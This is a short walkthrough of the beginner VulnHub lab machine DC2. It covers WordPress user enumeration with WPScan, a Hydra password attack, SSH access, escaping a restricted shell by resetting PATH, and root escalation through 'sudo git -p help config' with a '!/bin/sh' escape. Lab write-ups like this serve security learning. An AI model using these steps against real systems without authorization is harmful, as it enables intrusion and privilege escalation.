# DC2 Writeup

## Machine Information

* Platform: VulnHub
* Machine: DC2
* Difficulty: Beginner

## Tools Used

* Nmap
* Gobuster
* WPScan
* Hydra
* SSH
* Linux Terminal

## Enumeration

### Network Discovery

Identified the target machine on the network and performed a full port scan.

```bash
nmap -sn <network>
nmap -p- -sV <target-ip>
```

### Open Ports

* HTTP
* SSH (Port 7744)
<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/5209cfbc-df7c-4e07-aef6-e543e7084076" />

## Web Enumeration

The website was initially inaccessible by IP address.

Added the target to the local hosts file:

```bash
sudo nano /etc/hosts
```

Mapped the machine IP to:

```text
dc-2
```

After accessing the website, a clue was found indicating that a password could be obtained using CeWL.

## Directory Discovery

Used Gobuster to discover hidden directories and found the login page.

```bash
gobuster dir -u http://dc-2 -w <wordlist>
```

## WordPress Enumeration

Used WPScan to gather information about the WordPress installation.

```bash
wpscan --url http://dc-2 --enumerate p --enumerate t --enumerate u
```
<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/0aba6aa3-1cd6-4e67-9690-a1382051a910" />

### Users Found

* admin
* tom
* jerry

Created a user list file for password attacks.

## Password Attack

Used Hydra against the discovered usernames and successfully obtained valid credentials.

## SSH Access

Connected to the machine using Tom's credentials.

```bash
ssh tom@dc-2 -p 7744
```

Discovered flag3.txt but encountered restricted command execution.

## Restricted Shell Bypass

Checked the environment path:

```bash
echo $PATH
ls /home/tom/usr/bin
```

Modified the PATH variable:

```bash
export PATH=/usr/bin:/bin:$PATH
```

or

```bash
export PATH=/bin
```

This restored access to required commands.

## Lateral Movement

Switched from Tom to Jerry using:

```bash
su jerry
```

## Privilege Escalation

Identified that Jerry could execute Git with elevated privileges.

Escalated privileges using:

```bash
sudo git -p help config
```

Then escaped to a shell:

```bash
!/bin/sh
```

## Root Access

Successfully obtained root privileges.

```bash
cd /root
ls
cat final-flag.txt
```
<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/a27e4d10-40e0-408c-b86f-0d835acd8408" />


## Flags Collected

* Flag 1
* Flag 2
* Flag 3
* Final Root Flag

## Lessons Learned

* Host file manipulation
* WordPress enumeration with WPScan
* Credential attacks with Hydra
* Restricted shell bypass techniques
* Privilege escalation using Git
